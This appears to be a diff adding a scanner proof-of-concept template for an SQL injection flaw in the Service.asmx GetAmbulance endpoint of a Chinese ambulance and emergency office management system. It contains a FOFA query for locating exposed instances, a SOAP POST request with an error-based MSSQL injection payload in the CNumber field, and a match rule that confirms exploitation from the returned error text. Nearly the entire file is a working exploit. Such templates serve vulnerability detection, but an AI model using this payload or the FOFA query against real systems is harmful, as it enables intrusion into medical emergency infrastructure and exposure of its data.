@@ -1,0 +1,25 @@
+id: poc-yaml-anke-service-asmx-sqli
+info:
+  name: 安克医疗急救办公管理系统 Service.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 安克医疗急救办公管理系统
+  fofa: body="/Content/easyui1.3.3/themes"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /api/Service.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/GetAmbulance
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetAmbulance xmlns=\"http://tempuri.org/\">\n      <CNumber>1'\
+    \ AND 6537 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))-- ntgj</CNumber>\n\
+    \    </GetAmbulance>\n  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"0x"
+    + t2) && contains(body,"转换成数据类型 int 时失败") && contains(content_type,"text/xml")
+transport: http
